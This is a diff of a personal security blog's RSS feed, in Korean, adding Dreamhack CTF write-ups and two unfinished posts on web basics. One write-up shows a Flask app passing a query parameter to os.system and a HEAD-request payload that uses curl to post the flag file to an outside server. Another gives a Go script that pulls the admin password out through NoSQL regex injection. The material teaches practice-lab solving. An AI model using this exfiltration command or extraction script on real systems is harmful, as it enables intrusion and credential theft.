@@ -6,7 +6,189 @@
         <description>Recent content on SooHo&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 10 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 06 May 2022 21:57:09 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>[dreamhack] blind-command</title>
+        <link>https://appealso.github.io/p/dreamhack-blind-command/</link>
+        <pubDate>Fri, 06 May 2022 21:57:09 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/dreamhack-blind-command/</guid>
+        <description>&lt;h2 id=&#34;문제&#34;&gt;[문제]&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Read the flag file XD&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;해결법&#34;&gt;[해결법]&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;HTTP GET Method 우회하여 푸는 문제였다&lt;/li&gt;
+&lt;li&gt;아래 서버 코드를 보면 GET request를 받을 경우 GET 요청이 아닐 경우 커맨드가 실행되는 것을 확인할 수 있었다.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flask&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;?cmd=[cmd]&amp;#34;&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;BURP로 OPTIONS 요청을 보내 사용가능한 Method를 확인했다.
+&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://appealso.github.io/ctf11-01.png&#34; &gt;
+		&lt;img src=&#34;https://appealso.github.io/ctf11-01.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;ctf&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;ctf&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;GET으로는 우회가 안되니 HEAD를 활용한 문제라는 것을 알 수 있었다.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;HEAD 메소드 특성상 body가 들어가지 않기 떄문에 curl을 이용해 외부서버에 요청하기로 생각했다.&lt;/p&gt;
+&lt;h5 id=&#34;참고&#34;&gt;참고&lt;/h5&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/ko/docs/Web/HTTP/Methods/HEAD&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://developer.mozilla.org/ko/docs/Web/HTTP/Methods/HEAD&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;요청 서버는 dreamhack 에서 제공하는 서버에 요청하기로 생각을 했고 payload를 작성해서 날리니 해결되었다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;dreamhack tool : &lt;a class=&#34;link&#34; href=&#34;https://tools.dreamhack.games/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tools.dreamhack.games/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;HEAD /?cmd=curl &lt;!-- raw HTML omitted --&gt; -d &amp;ldquo;$(cat flag.py)&amp;rdquo;
+&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://appealso.github.io/ctf11-02.png&#34; &gt;
+		&lt;img src=&#34;https://appealso.github.io/ctf11-02.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;ctf&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;ctf&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;정답화면은 SKIP&lt;br&gt;
+++ app.py를 수정해서 답을 찾아볼까도 생각을 했는데, 쓰기 권한이 빠져있어서 이건 안될 것이라고 생각이 든다.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>[dreamhack] Mango</title>
+        <link>https://appealso.github.io/p/dreamhack-mango/</link>
+        <pubDate>Fri, 06 May 2022 21:45:29 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/dreamhack-mango/</guid>
+        <description>&lt;h2 id=&#34;문제&#34;&gt;[문제]&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다.&lt;br&gt;
+플래그는 admin 계정의 비밀번호 입니다.&lt;br&gt;
+플래그의 형식은 DH{…} 입니다.&lt;br&gt;
+{‘uid’: ‘admin’, ‘upw’: ‘DH{32alphanumeric}’}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;해결법&#34;&gt;[해결법]&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;NoSQL 인젝션을 하는 문제&lt;/li&gt;
+&lt;li&gt;NoSQL 인젝션에 사용하는 정규표현식을 필터링 하지 않아 쉽게 추출할 수 있었다.&lt;/li&gt;
+&lt;li&gt;Go 공부할겸 Go로 짜보았는데 문법이 익숙하지 않아 2시간정도 걸린것 같다;ㅁ;&lt;/li&gt;
+&lt;li&gt;Go에서 알파벳, 숫자를 arr로 Converting 해주는 함수를 못 찾아 하드 코딩을 했는데 뭔가 지저분 해졌다.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;main&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+	&lt;span class=&#34;s&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
+	&lt;span class=&#34;s&#34;&gt;&amp;#34;io/ioutil&amp;#34;&lt;/span&gt;
+	&lt;span class=&#34;s&#34;&gt;&amp;#34;net/http&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;arr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;6&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;7&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;9&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;g&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;h&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;j&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;k&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;o&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;p&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;t&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;u&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;v&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;y&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;z&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+
+	&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;tmparr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;range&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;arr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+			&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;lt;attackURL&amp;gt;/login?uid[$regex]=^a.&amp;amp;upw[$regex]=.{&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;tmparr&lt;/span&gt;
+			&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+				&lt;span class=&#34;nb&#34;&gt;panic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+			&lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+			&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ioutil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;ReadAll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+				&lt;span class=&#34;nb&#34;&gt;panic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+				&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;tmparr&lt;/span&gt;
+				&lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+				&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+				&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
+			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>Basicweb3</title>
+        <link>https://appealso.github.io/p/basicweb3/</link>
+        <pubDate>Fri, 06 May 2022 19:01:47 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/basicweb3/</guid>
+        <description>&lt;p&gt;수정중&amp;hellip;
+SOP
+Same Origin
+Cross Origin
+CORS&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>웹 기초 정리(2) - HTTP/HTTPS, 웹서버, 웹리소스, 웹서비스 ,쿠키, 세션</title>
+        <link>https://appealso.github.io/p/%EC%9B%B9-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC2-http/https-%EC%9B%B9%EC%84%9C%EB%B2%84-%EC%9B%B9%EB%A6%AC%EC%86%8C%EC%8A%A4-%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%BF%A0%ED%82%A4-%EC%84%B8%EC%85%98/</link>
+        <pubDate>Fri, 06 May 2022 19:00:35 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/%EC%9B%B9-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC2-http/https-%EC%9B%B9%EC%84%9C%EB%B2%84-%EC%9B%B9%EB%A6%AC%EC%86%8C%EC%8A%A4-%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%BF%A0%ED%82%A4-%EC%84%B8%EC%85%98/</guid>
+        <description>&lt;p&gt;수정중&amp;hellip;&lt;/p&gt;
+&lt;p&gt;HTTP/HTTPS
+HTT란?
+형태&lt;/p&gt;
+&lt;p&gt;HTTPS 개요
+HTTP 응답 값&lt;/p&gt;
+&lt;p&gt;웹 서버, 웹 리소스, 웹서비스&lt;/p&gt;
+&lt;p&gt;Cookie &amp;amp; Seesion&lt;/p&gt;
+&lt;h2 id=&#34;출처-및-참고&#34;&gt;출처 및 참고&lt;/h2&gt;
+</description>
+        </item>
+        <item>
         <title>Spring4Shell 취약점 정리</title>
         <link>https://appealso.github.io/p/spring4shell-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%AC/</link>
         <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
